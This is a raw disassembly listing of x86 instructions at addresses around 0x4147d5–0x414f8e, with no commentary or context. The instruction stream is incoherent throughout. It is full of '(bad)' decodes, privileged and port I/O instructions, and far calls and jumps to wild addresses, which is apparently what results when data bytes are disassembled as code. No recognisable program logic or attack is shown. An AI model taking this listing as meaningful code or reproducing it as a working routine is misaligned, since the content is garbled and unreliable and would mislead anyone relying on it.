  4147d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d6:	daa    
  4147d7:	popf   
  4147d8:	fbstp  TBYTE PTR [eax+eax*4-0x5b]
  4147dc:	fadd   DWORD PTR [ebx-0x600c0f16]
  4147e2:	fstp   DWORD PTR [edx]
  4147e4:	push   ecx
  4147e5:	ror    ebx,1
  4147e7:	das    
  4147e8:	je     0x4147b5
  4147ea:	div    dl
  4147ec:	sysret 
  4147ee:	aad    0x9f
  4147f0:	mov    eax,0xe61a06d9
  4147f5:	push   ss
  4147f6:	xchg   edx,eax
  4147f7:	push   0x23
  4147f9:	jge    0x414823
  4147fb:	adc    eax,0xeea6491e
  414800:	add    ah,BYTE PTR [ebp+0x1d50639a]
  414806:	fnsave ds:0x16ba4ce2
  41480c:	sub    BYTE PTR [edi],ch
  41480e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480f:	fwait
  414810:	sbb    BYTE PTR [esi+0x10],ah
  414813:	mov    eax,DWORD PTR [ebp-0x1376893a]
  414819:	inc    edx
  41481a:	icebp  
  41481b:	adc    eax,0x15dec770
  414820:	fisttp WORD PTR [edx+0x7e7a4288]
  414826:	fild   QWORD PTR [esi-0x53]
  414829:	adc    dh,cl
  41482b:	cmp    ecx,edi
  41482d:	shl    DWORD PTR [ebp+0x5c],cl
  414830:	lahf   
  414831:	jae    0x4147ee
  414833:	out    0x3,al
  414835:	mov    bl,0xdb
  414837:	mov    edi,DWORD PTR [ecx-0x1923eec]
  41483d:	xchg   esi,eax
  41483e:	dec    edi
  41483f:	cwde   
  414840:	sbb    DWORD PTR [esi+0x6c],0xffffffa9
  414844:	ja     0x41487e
  414846:	or     al,0x31
  414849:	out    0x3d,al
  41484b:	fst    DWORD PTR [ebp+0x17824fa4]
  414851:	retf   0xb4c6
  414854:	add    al,0xc5
  414856:	dec    eax
  414857:	iret   
  414858:	mov    cl,0x94
  41485a:	std    
  41485b:	sti    
  41485c:	mov    edi,0xca8bf800
  414861:	jbe    0x414842
  414863:	pop    ss
  414864:	jmp    0xb946c74b
  414869:	mov    esp,0x2fabc686
  41486e:	aad    0xf
  414870:	sbb    bh,BYTE PTR [edi]
  414872:	cmp    BYTE PTR [edx-0x76c5fdbc],cl
  414878:	test   al,0xde
  41487a:	xchg   esp,eax
  41487b:	sti    
  41487c:	fisubr DWORD PTR [ecx+0x6286c15a]
  414882:	xchg   ebx,eax
  414883:	mov    ds:0x1b552429,eax
  414888:	addr16 arpl cx,dx
  41488b:	ds leave 
  41488d:	in     eax,dx
  41488e:	loopne 0x414857
  414890:	xor    bh,BYTE PTR [ebx]
  414892:	ja     0x4148c1
  414894:	xchg   ebp,eax
  414895:	fs cli 
  414897:	(bad)  
  414898:	es jns 0x414847
  41489b:	jns    0x414895
  41489d:	add    cl,bh
  41489f:	popa   
  4148a0:	pusha  
  4148a1:	loopne 0x4148e8
  4148a3:	push   0xffffffed
  4148a5:	shr    DWORD PTR [ecx+0x1e],0xb0
  4148a9:	or     eax,DWORD PTR [eax-0x55]
  4148ac:	out    0xf0,al
  4148ae:	das    
  4148af:	pusha  
  4148b0:	sar    DWORD PTR [bp+di],0x89
  4148b4:	mov    bh,BYTE PTR [ecx-0x1d532b78]
  4148ba:	push   ebp
  4148bb:	shr    dl,1
  4148bd:	ins    BYTE PTR es:[edi],dx
  4148be:	int3   
  4148bf:	scas   eax,DWORD PTR es:[edi]
  4148c0:	dec    ecx
  4148c1:	popa   
  4148c2:	or     cl,ah
  4148c4:	stos   DWORD PTR es:[edi],eax
  4148c5:	sub    DWORD PTR [edx+0x377c97a8],esp
  4148cb:	out    0x5c,eax
  4148cd:	icebp  
  4148ce:	iret   
  4148cf:	fwait
  4148d0:	retf   0xcc08
  4148d3:	inc    ebx
  4148d4:	mov    bh,0x5f
  4148d6:	loopne 0x414894
  4148d8:	imul   ecx,ebp,0xffffffff
  4148db:	inc    esi
  4148dc:	add    DWORD PTR [ebx-0x6b67b499],0xffffffd5
  4148e3:	or     eax,0xd1878c17
  4148e8:	sub    DWORD PTR [esi],0x39afec69
  4148ee:	mov    edx,0x66e0aa1f
  4148f3:	push   0xe370dc76
  4148f8:	sbb    BYTE PTR [eax+0x4d],0x3c
  4148fc:	and    edi,esp
  4148fe:	(bad)  
  4148ff:	xor    DWORD PTR [edi-0x16fdff3c],esi
  414905:	fild   QWORD PTR [ebx]
  414907:	lods   al,BYTE PTR ds:[esi]
  414908:	sahf   
  414909:	inc    edi
  41490a:	and    ch,BYTE PTR [esi+0x71]
  41490d:	xchg   esp,eax
  41490e:	call   0x7c9d:0x3daf4f75
  414915:	pop    ebp
  414916:	enter  0x1d7d,0x74
  41491a:	xor    al,0xce
  41491c:	in     al,dx
  41491d:	in     al,dx
  41491e:	je     0x4148ac
  414920:	mov    bh,0x59
  414922:	mov    ecx,0xa248bd34
  414927:	adc    eax,ebp
  414929:	leave  
  41492a:	pop    es
  41492b:	lock repz xor ecx,DWORD PTR [eax+eiz*8]
  414930:	xchg   esp,eax
  414931:	lock imul BYTE PTR [esi+0x16]
  414935:	xchg   ebx,eax
  414936:	mov    al,ds:0x143b141d
  41493b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41493c:	repnz and al,0x9d
  41493f:	mov    eax,0x7606f18b
  414944:	cdq    
  414945:	pop    esp
  414946:	jo     0x414991
  414948:	jnp    0x4148e6
  41494a:	dec    BYTE PTR [eax+0x4f9359c4]
  414950:	rol    edx,cl
  414952:	out    0xcd,eax
  414954:	aad    0x54
  414956:	xchg   edx,eax
  414957:	addr16 push eax
  414959:	inc    esi
  41495a:	mov    dh,0x4a
  41495c:	dec    edi
  41495d:	call   0xb0ad763c
  414962:	(bad)  [ecx+0x54]
  414965:	ins    BYTE PTR es:[edi],dx
  414966:	sti    
  414967:	icebp  
  414968:	nop
  414969:	test   DWORD PTR [edi+ecx*4],edx
  41496c:	xor    BYTE PTR [edx+edx*8],bl
  41496f:	inc    eax
  414970:	test   eax,0x340c3b73
  414975:	add    BYTE PTR [edx-0x55],bl
  414978:	adc    edi,DWORD PTR [eax]
  41497a:	cli    
  41497b:	es and ebx,ebp
  41497e:	pop    es
  41497f:	push   es
  414980:	cli    
  414981:	fbstp  TBYTE PTR [ebx+0x58]
  414984:	or     BYTE PTR [edi],0xd3
  414987:	dec    ebp
  414988:	adc    eax,0xb6e5ba95
  41498d:	mov    cl,0xfd
  41498f:	call   0x4847908b
  414994:	mov    bl,0x68
  414996:	xor    ebx,edx
  414998:	scas   al,BYTE PTR es:[edi]
  414999:	mov    ebx,DWORD PTR [esi+ebp*8]
  41499c:	jmp    0x4149cd
  41499e:	mov    esi,0xa1ce4b5
  4149a3:	xchg   esp,eax
  4149a4:	pop    es
  4149a5:	mov    cl,0xce
  4149a7:	or     esp,DWORD PTR [esi-0x6f]
  4149aa:	or     BYTE PTR [ebp+0x5d],bh
  4149ad:	loop   0x414a1f
  4149af:	int    0x50
  4149b1:	push   ds
  4149b2:	call   0x1700e3a5
  4149b7:	inc    eax
  4149b8:	out    0xf2,al
  4149ba:	hlt    
  4149bb:	lock sahf 
  4149bd:	fsub   QWORD PTR [ebp+0x5863c4d2]
  4149c3:	fild   DWORD PTR [ebx]
  4149c5:	xlat   BYTE PTR ds:[ebx]
  4149c6:	pop    eax
  4149c7:	pop    edi
  4149c8:	cmp    ebx,DWORD PTR [eax-0x7cff7ca0]
  4149ce:	lods   al,BYTE PTR ds:[esi]
  4149cf:	mov    al,BYTE PTR [edx-0x6ee9c53f]
  4149d5:	retf   0x8050
  4149d8:	add    ah,BYTE PTR ds:0x8641e0ad
  4149de:	dec    eax
  4149df:	xor    ecx,DWORD PTR [ebp+eax*2-0x5a]
  4149e3:	cwde   
  4149e4:	sti    
  4149e5:	mov    ecx,0xd0128838
  4149ea:	jmp    0x4149ed
  4149ec:	push   edx
  4149ed:	jae    0x41499a
  4149ef:	mov    bl,0xb4
  4149f1:	in     al,dx
  4149f2:	mov    esp,0xa6bddebc
  4149f7:	pop    esi
  4149f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149f9:	xchg   ecx,eax
  4149fa:	xchg   ebp,eax
  4149fb:	lock pusha 
  4149fd:	mov    dh,0xf9
  4149ff:	pop    ds
  414a00:	fisttp DWORD PTR [ebx-0x707c1aab]
  414a06:	sub    al,0x8
  414a08:	xchg   ecx,eax
  414a09:	rol    BYTE PTR [ebp-0x3163882e],0x62
  414a10:	(bad)  
  414a11:	push   0x96f871f1
  414a16:	mov    bp,0x1f27
  414a1a:	push   ecx
  414a1b:	cmc    
  414a1c:	dec    edi
  414a1d:	cmp    DWORD PTR [ebp-0x4b],0x177a5db
  414a24:	dec    ecx
  414a25:	test   BYTE PTR [edi-0x4f],dl
  414a28:	pop    ss
  414a29:	ins    BYTE PTR es:[edi],dx
  414a2a:	mov    esi,0x6388b174
  414a2f:	mov    dl,0xd0
  414a31:	jmp    0x4149fb
  414a33:	dec    ebp
  414a34:	jae    0x414a46
  414a36:	loope  0x4149fd
  414a38:	inc    esi
  414a39:	ja     0x414a83
  414a3b:	les    esi,FWORD PTR [esi-0x5f]
  414a3e:	lods   eax,DWORD PTR ds:[esi]
  414a3f:	xor    edx,DWORD PTR [esi+ecx*2+0x50]
  414a43:	push   0x6f
  414a45:	cmp    dh,BYTE PTR [ecx]
  414a47:	arpl   WORD PTR [ecx],sp
  414a49:	fistp  QWORD PTR [ecx]
  414a4b:	mov    ecx,0x3a009eb0
  414a50:	xchg   ecx,eax
  414a51:	loop   0x414a1e
  414a53:	stos   DWORD PTR es:[edi],eax
  414a54:	jp     0x414a54
  414a56:	mov    cs,WORD PTR ds:0x8730d579
  414a5c:	push   ebp
  414a5d:	fidiv  WORD PTR [ecx+0x4a]
  414a60:	jg     0x414ac3
  414a62:	xchg   ecx,eax
  414a63:	pop    esi
  414a64:	fcomp  QWORD PTR [ebx+0x30]
  414a67:	mov    DWORD PTR [ecx-0x40ab44ac],ebx
  414a6d:	cmc    
  414a6e:	mov    edx,DWORD PTR [ecx+0x6b340346]
  414a74:	enter  0xb388,0x3d
  414a78:	inc    edx
  414a79:	lahf   
  414a7a:	das    
  414a7b:	pop    edx
  414a7c:	inc    edi
  414a7d:	addr16 mov dl,0x19
  414a80:	ret    0x8505
  414a83:	ret    
  414a84:	pop    edi
  414a85:	dec    esi
  414a86:	into   
  414a87:	and    al,0x1a
  414a89:	xchg   ebp,eax
  414a8a:	shr    ch,cl
  414a8c:	daa    
  414a8d:	mov    ah,BYTE PTR [edi-0x4b8083fd]
  414a93:	aaa    
  414a94:	mov    al,ds:0xc48ec55c
  414a99:	cli    
  414a9a:	jmp    0x414a8f
  414a9c:	xchg   ebp,eax
  414a9d:	(bad)  
  414a9e:	into   
  414a9f:	daa    
  414aa0:	pop    esp
  414aa1:	inc    ebx
  414aa2:	push   ss
  414aa3:	jecxz  0x414a45
  414aa5:	xchg   esp,eax
  414aa6:	push   ss
  414aa7:	jae    0x414aeb
  414aa9:	lods   al,BYTE PTR ds:[esi]
  414aaa:	(bad)  
  414aab:	call   0x7d5d:0xe6d73780
  414ab2:	iret   
  414ab3:	stos   DWORD PTR es:[edi],eax
  414ab4:	add    ecx,DWORD PTR [ecx]
  414ab6:	les    edi,FWORD PTR ds:0x3f53a914
  414abc:	jge    0x414a72
  414abe:	adc    ah,BYTE PTR [edx+0x67]
  414ac1:	aad    0x78
  414ac3:	jl     0x414a50
  414ac5:	test   eax,0x7f93078d
  414aca:	xor    BYTE PTR [edx+0x44],0xde
  414ace:	sti    
  414acf:	cld    
  414ad0:	mov    eax,ds:0xabf70d43
  414ad5:	lods   al,BYTE PTR ds:[esi]
  414ad6:	mov    esi,DWORD PTR [esi+ebx*4+0x6fcc7bda]
  414add:	xchg   DWORD PTR [edx-0xc],edx
  414ae0:	fwait
  414ae1:	xchg   edi,eax
  414ae2:	xor    BYTE PTR [edi+0x5b],al
  414ae5:	sub    eax,0xf5b10ae9
  414aea:	imul   edi,ebx,0x33112b5f
  414af0:	data16 loop 0x414aaf
  414af3:	sbb    esp,DWORD PTR [ecx+ebp*2+0x22]
  414af7:	xor    BYTE PTR [ebp+0x6a],bh
  414afa:	pop    edx
  414afb:	mov    dl,0x19
  414afd:	mov    ds:0x63938b26,al
  414b02:	fcmovne st,st(6)
  414b04:	cli    
  414b05:	or     BYTE PTR [ebx-0xd],0x6e
  414b09:	jne    0x414b5a
  414b0b:	retf   0x549c
  414b0e:	sbb    al,0x8b
  414b10:	popa   
  414b11:	jns    0x414b14
  414b13:	xchg   edx,eax
  414b14:	push   eax
  414b15:	push   esp
  414b16:	push   ebp
  414b17:	cmp    ah,BYTE PTR [eax-0x11]
  414b1a:	rcr    dl,1
  414b1c:	cli    
  414b1d:	imul   edx,esi,0xab6c52b5
  414b23:	outs   dx,DWORD PTR ds:[esi]
  414b24:	xlat   BYTE PTR ds:[ebx]
  414b25:	and    al,0x57
  414b27:	adc    eax,0xc5e2c6e4
  414b2c:	stos   DWORD PTR es:[edi],eax
  414b2d:	sbb    eax,0x6dd7d6cb
  414b32:	push   0xb4af79c
  414b37:	jecxz  0x414b6e
  414b39:	es gs mov ebx,0x25e4872d
  414b40:	ins    BYTE PTR es:[edi],dx
  414b41:	in     al,dx
  414b42:	push   0x4fec6e0b
  414b47:	scas   eax,DWORD PTR es:[edi]
  414b48:	sub    DWORD PTR [ebx+0x49b710e8],esi
  414b4e:	cmp    eax,0x75f75c
  414b53:	leave  
  414b54:	sbb    dh,dh
  414b56:	pop    esi
  414b57:	jno    0x414aea
  414b59:	xor    bh,bh
  414b5b:	add    eax,0x2273e950
  414b60:	scas   al,BYTE PTR es:[edi]
  414b61:	xchg   edi,eax
  414b62:	sbb    BYTE PTR [ebx+0x66db80d0],0x3e
  414b69:	jo     0x414b45
  414b6b:	lahf   
  414b6c:	in     al,0x29
  414b6e:	(bad)  
  414b70:	mov    ecx,0xa0fbb567
  414b75:	dec    edi
  414b76:	imul   ebp,DWORD PTR [esi-0x17],0xffffffad
  414b7a:	fldenv [edi+0x1a]
  414b7d:	imul   eax,DWORD PTR [ecx-0x3a849ec1],0x71
  414b84:	sbb    al,0x8
  414b86:	mov    DWORD PTR ds:0x15482d9,eax
  414b8c:	add    al,0x7
  414b8e:	cdq    
  414b8f:	inc    edx
  414b90:	jo     0x414b4d
  414b92:	sub    DWORD PTR [edi+eiz*4],0xb60a9784
  414b99:	fs adc eax,0xfc438c84
  414b9f:	sbb    al,0xfe
  414ba1:	pop    es
  414ba2:	out    0xed,al
  414ba4:	sti    
  414ba5:	and    DWORD PTR [edx+0x48],edx
  414ba8:	inc    ebx
  414ba9:	sub    ch,ah
  414bab:	sub    al,0x56
  414bad:	jp     0x414c08
  414baf:	cmp    eax,0x994ec644
  414bb4:	push   eax
  414bb5:	(bad)  
  414bb6:	(bad)  
  414bb7:	mov    edx,0xa7b25cd1
  414bbc:	cs jb  0x414c30
  414bbf:	shl    eax,0x4b
  414bc2:	mov    esi,0xefb53820
  414bc7:	mov    ds:0x2201b10d,eax
  414bcc:	sbb    eax,0x8f12e1b9
  414bd1:	mov    al,BYTE PTR [edx]
  414bd3:	xchg   ebx,eax
  414bd4:	(bad)  
  414bd5:	fmulp  st(5),st
  414bd7:	es (bad) 
  414bd9:	rcr    BYTE PTR [edx],cl
  414bdb:	mov    dl,0x95
  414bdd:	mov    ah,0x38
  414bdf:	push   es
  414be0:	into   
  414be1:	mov    BYTE PTR [ebx-0x73f7d392],dl
  414be7:	mov    esp,0x5f8fb271
  414bec:	inc    esp
  414bed:	fcomp  DWORD PTR ds:0xdc04c024
  414bf3:	xor    ebp,DWORD PTR [ebx]
  414bf5:	cmp    eax,0x3706ce4c
  414bfa:	arpl   WORD PTR [esi],si
  414bfc:	je     0x414c0e
  414bfe:	int3   
  414bff:	push   edi
  414c00:	sub    BYTE PTR [ecx],dh
  414c02:	xor    al,0xb1
  414c04:	add    al,0xc8
  414c06:	dec    DWORD PTR [eax]
  414c08:	cmp    edi,DWORD PTR [edx]
  414c0a:	cld    
  414c0b:	mov    al,0xa9
  414c0d:	sub    al,0xe3
  414c0f:	jl     0x414c5c
  414c11:	popf   
  414c12:	mov    edi,eax
  414c14:	cwde   
  414c15:	mov    edx,DWORD PTR [ebp+0x7c]
  414c18:	call   0xcc03d87f
  414c1d:	es sub eax,0xc32bf332
  414c23:	ret    0xea64
  414c26:	lods   al,BYTE PTR ds:[esi]
  414c27:	dec    ebx
  414c28:	aaa    
  414c29:	mov    eax,0x6318bfa3
  414c2e:	(bad)  
  414c2f:	rcr    BYTE PTR [esi-0x34],1
  414c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c33:	xchg   ecx,eax
  414c34:	cmp    eax,0x6fec0112
  414c39:	rol    DWORD PTR [edi],0xa7
  414c3c:	sub    cl,bh
  414c3e:	xchg   ebp,eax
  414c3f:	cmp    DWORD PTR [ecx],esp
  414c41:	ret    
  414c42:	out    0x6d,al
  414c44:	mov    al,0xab
  414c46:	push   edi
  414c47:	int    0xd4
  414c49:	jge    0x414c15
  414c4b:	sbb    BYTE PTR [edi-0x4e017219],al
  414c51:	daa    
  414c52:	jb     0x414c27
  414c54:	imul   ebp,DWORD PTR [ecx+0x76],0x50
  414c58:	iret   
  414c59:	js     0x414c40
  414c5b:	scas   al,BYTE PTR es:[edi]
  414c5c:	jb     0x414c78
  414c5e:	inc    ebx
  414c5f:	clc    
  414c60:	or     DWORD PTR [esi],esi
  414c62:	xchg   esp,eax
  414c63:	add    dl,BYTE PTR [ecx-0x7a]
  414c66:	sbb    BYTE PTR [ebp-0x59],ah
  414c69:	xchg   edi,eax
  414c6a:	push   0xffffff82
  414c6c:	pop    ds
  414c6d:	outs   dx,BYTE PTR ds:[esi]
  414c6e:	into   
  414c6f:	mov    ah,0xd8
  414c71:	mov    ecx,DWORD PTR [ebp+edx*1+0x32]
  414c75:	es push eax
  414c77:	cld    
  414c78:	push   es
  414c79:	xchg   BYTE PTR [esp],bh
  414c7c:	popfw  
  414c7e:	jge    0x414c56
  414c80:	out    0xd1,al
  414c82:	mov    bl,al
  414c84:	call   0xe407811e
  414c89:	inc    ebp
  414c8a:	test   eax,0x46341693
  414c8f:	push   cs
  414c90:	mov    edx,0x504cb3e8
  414c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c96:	pxor   mm2,QWORD PTR [ebx-0x1b5b7abd]
  414c9d:	mov    edi,0x16dab0c9
  414ca2:	outs   dx,BYTE PTR ds:[esi]
  414ca3:	or     esi,DWORD PTR [ebx+0x19b04c56]
  414ca9:	mov    ds:0x11a97d7d,al
  414cae:	(bad)  
  414caf:	fidivr DWORD PTR [ecx]
  414cb1:	xor    al,0xf1
  414cb3:	add    BYTE PTR [ebp-0x6e6bac86],bh
  414cb9:	mov    dh,0xc9
  414cbb:	(bad)
  414cbe:	mov    al,cs:0xf47fae9
  414cc4:	pop    eax
  414cc5:	cmp    eax,0xe9fbc197
  414cca:	add    DWORD PTR [ebx],0x2c
  414ccd:	fild   DWORD PTR [ecx-0x550363d2]
  414cd3:	lea    edx,[esi]
  414cd5:	adc    ebp,0x64
  414cd8:	xor    eax,0x36567f3d
  414cdd:	fcmovb st,st(2)
  414cdf:	out    dx,eax
  414ce0:	mov    dl,0x29
  414ce2:	fwait
  414ce3:	adc    DWORD PTR [ebp-0x10951b06],edi
  414ce9:	xor    DWORD PTR [ecx-0x2a],ecx
  414cec:	jecxz  0x414cda
  414cee:	jp     0x414cce
  414cf0:	int    0xa4
  414cf2:	mov    esi,0xfb88fa11
  414cf7:	xchg   edi,eax
  414cf8:	inc    esp
  414cf9:	test   BYTE PTR [ebx-0x1f],bl
  414cfc:	sbb    BYTE PTR [eax+0x4a],ch
  414cff:	cmp    BYTE PTR [edi-0x721d129a],ch
  414d05:	push   esp
  414d06:	pop    ecx
  414d07:	mov    eax,ds:0xb1f5d7d4
  414d0c:	arpl   WORD PTR [esi+0x49bcac3],sp
  414d12:	push   ecx
  414d13:	cdq    
  414d14:	adc    DWORD PTR [eax+edi*1],0xffffff82
  414d18:	add    al,0x19
  414d1a:	ret    0x7be6
  414d1d:	outs   dx,BYTE PTR ds:[esi]
  414d1e:	mov    dl,0x7c
  414d20:	push   esp
  414d21:	pop    esi
  414d22:	fidiv  DWORD PTR [eax+0x17]
  414d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d26:	ror    BYTE PTR [eax],0x49
  414d29:	shl    DWORD PTR [edx-0x7f],cl
  414d2c:	shr    ah,1
  414d2e:	adc    dl,ah
  414d30:	imul   ebx,edx,0x92f21e33
  414d36:	inc    esi
  414d37:	mov    bl,0x75
  414d39:	aaa    
  414d3a:	mov    ebp,0xacc5c1cc
  414d3f:	xlat   BYTE PTR ds:[ebx]
  414d40:	lods   al,BYTE PTR ds:[esi]
  414d41:	loopne 0x414d45
  414d43:	dec    ecx
  414d44:	test   DWORD PTR [edx+0xa],ecx
  414d47:	lock push esi
  414d49:	push   ebx
  414d4a:	sbb    ebx,edi
  414d4c:	jae    0x414d7b
  414d4e:	push   ebx
  414d4f:	push   ss
  414d50:	mov    ebp,0xf5ebe537
  414d55:	push   cs
  414d56:	mov    bl,0x2
  414d58:	aam    0xf0
  414d5a:	hlt    
  414d5b:	in     eax,0xd6
  414d5d:	and    al,0xc0
  414d5f:	xor    ch,BYTE PTR [ebx+eax*4]
  414d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d63:	scas   eax,DWORD PTR es:[edi]
  414d64:	inc    DWORD PTR [eax+eiz*2-0x1e]
  414d68:	cmp    eax,0x8204f962
  414d6d:	test   al,0x53
  414d6f:	jecxz  0x414cf4
  414d71:	dec    esi
  414d72:	or     eax,0x60986d69
  414d77:	mov    ds:0x605d2fe5,al
  414d7c:	scas   al,BYTE PTR es:[edi]
  414d7d:	rcr    BYTE PTR [edi],1
  414d7f:	push   0xe60cfdd8
  414d84:	aam    0xbc
  414d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d87:	dec    eax
  414d88:	fwait
  414d89:	jmp    0x414d44
  414d8b:	fisubr DWORD PTR [edi-0x20f68bc9]
  414d91:	jnp    0x414dd7
  414d93:	jb     0x414dcf
  414d95:	dec    ecx
  414d96:	(bad)  
  414d97:	fst    DWORD PTR [edx-0x70]
  414d9a:	pop    edx
  414d9b:	or     al,0x11
  414d9d:	repz lea sp,[ebx-0x9]
  414da2:	enter  0x77ea,0x88
  414da6:	xor    cl,bl
  414da8:	fsubr  DWORD PTR [ebp-0x21451770]
  414dae:	pop    esi
  414daf:	rol    BYTE PTR [ebx-0x10],0x2a
  414db3:	into   
  414db4:	add    al,0x2b
  414db6:	add    esp,DWORD PTR [edx-0x5630ecc9]
  414dbc:	jl     0x414df8
  414dbe:	mov    bl,0x3b
  414dc0:	jge    0x414e0b
  414dc2:	lahf   
  414dc3:	xchg   DWORD PTR [ecx],eax
  414dc5:	sub    dl,ah
  414dc7:	test   DWORD PTR [esi+0x1b],0x2188bc8b
  414dce:	enter  0x1bf7,0xe6
  414dd2:	into   
  414dd3:	mov    ebx,0x88887365
  414dd8:	xchg   ecx,eax
  414dd9:	and    BYTE PTR [ecx-0x7],0x29
  414ddd:	xor    eax,0xa7b78ef0
  414de2:	sub    eax,0xeacc1385
  414de7:	shl    DWORD PTR [edx+0x5a],0x6a
  414deb:	dec    esp
  414dec:	mov    bl,0x73
  414dee:	retf   
  414def:	adc    bh,ch
  414df1:	xchg   BYTE PTR [ebp+0x26],dh
  414df4:	xor    dh,dl
  414df6:	adc    esp,DWORD PTR [ecx-0x73]
  414df9:	in     eax,0x51
  414dfb:	push   ecx
  414dfc:	aad    0xa
  414dfe:	add    ah,dl
  414e00:	push   ecx
  414e01:	jnp    0x414df3
  414e03:	daa    
  414e04:	js     0x414e40
  414e06:	xchg   DWORD PTR [ebx-0x38],ebx
  414e09:	neg    BYTE PTR [ecx-0x6f826a0a]
  414e0f:	dec    ebp
  414e10:	iret   
  414e11:	xchg   ecx,eax
  414e12:	dec    edi
  414e13:	(bad)  
  414e14:	dec    edi
  414e15:	dec    esp
  414e16:	sar    BYTE PTR [edi-0x3107098e],0x9e
  414e1d:	mov    eax,0x94291f27
  414e22:	add    edi,esi
  414e24:	push   edx
  414e25:	dec    edi
  414e26:	aam    0xd8
  414e28:	jnp    0x414e5f
  414e2a:	mov    eax,0x767cdc56
  414e2f:	cmp    al,0x33
  414e31:	sbb    eax,0x194a94ce
  414e36:	push   ecx
  414e37:	jl     0x414e8f
  414e39:	mov    bh,0xf1
  414e3b:	aaa    
  414e3c:	fsubr  DWORD PTR [edi+edi*2-0x29]
  414e40:	sbb    BYTE PTR [esi+0x1abb25a4],0xbe
  414e47:	test   DWORD PTR [ecx-0x5e],edi
  414e4a:	and    eax,0x73a92528
  414e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e50:	aaa    
  414e51:	inc    esp
  414e52:	or     bh,ah
  414e54:	bound  eax,QWORD PTR [edi+edx*2-0x36]
  414e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e59:	shr    BYTE PTR [ebx],1
  414e5b:	or     DWORD PTR ds:[ebx-0x17],eax
  414e5f:	pop    edi
  414e60:	es adc al,0xf7
  414e63:	mov    eax,0xb6329067
  414e68:	adc    eax,0x8ca95d35
  414e6d:	pop    ds
  414e6e:	retf   0x7334
  414e71:	adc    DWORD PTR [ebp-0x39c7f07a],0x2df311c5
  414e7b:	cmp    al,dh
  414e7d:	pop    es
  414e7e:	sbb    eax,0x3d9186d4
  414e83:	sbb    esp,DWORD PTR [ebx+eiz*8]
  414e86:	jmp    0x754efdc7
  414e8b:	sub    esp,DWORD PTR [ebx+0x61ae539c]
  414e91:	fcomp  DWORD PTR [ebx-0x78]
  414e94:	ror    BYTE PTR [ebp-0x47adb1b1],0x47
  414e9b:	cmp    edi,edi
  414e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e9e:	pop    ds
  414e9f:	repnz xchg ebx,eax
  414ea1:	call   DWORD PTR [ebx+eiz*1+0x13c25ea0]
  414ea8:	inc    ecx
  414ea9:	punpcklwd mm4,mm5
  414eac:	cmp    bl,al
  414eae:	xchg   ebx,eax
  414eaf:	jbe    0x414e7e
  414eb1:	loopne 0x414e41
  414eb3:	jae    0x414eee
  414eb5:	push   edi
  414eb6:	repnz test eax,0x10d8a608
  414ebc:	ja     0x414e5e
  414ebe:	jp     0x414f07
  414ec0:	fistp  DWORD PTR [ecx+eax*8]
  414ec3:	in     al,dx
  414ec4:	fucomp st(4)
  414ec6:	jno    0x414ec3
  414ec8:	pop    edi
  414ec9:	fidivr DWORD PTR [edi]
  414ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ecc:	add    DWORD PTR [eax],esp
  414ece:	push   esp
  414ecf:	mov    esp,0x766475de
  414ed4:	les    ebp,FWORD PTR [ebp+0x5b]
  414ed7:	jl     0x414ef9
  414ed9:	std    
  414eda:	xor    edx,esp
  414edc:	jmp    0x8119:0x8e6a8d13
  414ee3:	push   ebp
  414ee4:	mov    eax,ds:0x3161c0a6
  414ee9:	iret   
  414eea:	and    cl,bh
  414eec:	aaa    
  414eed:	pop    esp
  414eee:	aam    0x89
  414ef0:	js     0x414f53
  414ef2:	jnp    0x414f02
  414ef4:	retf   0xfafa
  414ef7:	and    edi,0x1fc26c95
  414efd:	push   ss
  414efe:	mov    dh,al
  414f00:	pop    ss
  414f01:	adc    al,BYTE PTR [edi+0x5c782bc1]
  414f07:	jle    0x414f7d
  414f09:	add    ecx,DWORD PTR [ebx-0x22]
  414f0c:	mov    ch,0x4d
  414f0e:	call   0xb6de9a24
  414f13:	das    
  414f14:	sahf   
  414f15:	(bad)  
  414f16:	or     al,0x9a
  414f18:	out    dx,eax
  414f19:	dec    ebp
  414f1a:	xor    DWORD PTR [esi],0xfaafcf3
  414f20:	or     al,0x35
  414f22:	ret    
  414f23:	pop    esi
  414f24:	and    eax,0x1251898
  414f29:	cmp    ch,bl
  414f2b:	ud2    
  414f2d:	mov    al,0xee
  414f2f:	adc    edx,DWORD PTR [edi-0x77]
  414f32:	inc    edi
  414f33:	call   0x75b6b200
  414f38:	int    0xb7
  414f3a:	cmovg  ebp,eax
  414f3d:	add    cl,dh
  414f3f:	pop    es
  414f40:	mov    esp,0x57ca8c2f
  414f45:	pop    edx
  414f46:	inc    edx
  414f47:	gs pop ds
  414f49:	stc    
  414f4a:	loop   0x414f25
  414f4c:	and    eax,0xf5a1be07
  414f51:	loope  0x414f9f
  414f53:	leave  
  414f54:	pop    edx
  414f55:	repz aaa 
  414f57:	pushf  
  414f58:	inc    eax
  414f59:	cmp    ah,BYTE PTR [eax+esi*8]
  414f5c:	mov    ebp,0x431b6a20
  414f61:	cmc    
  414f62:	dec    eax
  414f63:	nop
  414f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f65:	sahf   
  414f66:	jns    0x414f76
  414f68:	inc    edi
  414f69:	mov    cl,0x92
  414f6b:	cmp    edi,DWORD PTR [edx]
  414f6d:	scas   al,BYTE PTR es:[edi]
  414f6e:	push   esi
  414f6f:	aaa    
  414f70:	je     0x414f4c
  414f72:	cmovnp esi,DWORD PTR [esi+0x3d]
  414f76:	adc    DWORD PTR [ecx-0x2efa6180],ecx
  414f7c:	sub    BYTE PTR [edi],bl
  414f7e:	fadd   QWORD PTR ds:0xe806241
  414f84:	cmovp  esi,DWORD PTR [eax-0x4322e049]
  414f8b:	retf   
  414f8c:	adc    BYTE PTR [edx],ch
  414f8e:	xor    ebx,DWORD PTR ds:0xeca26f83
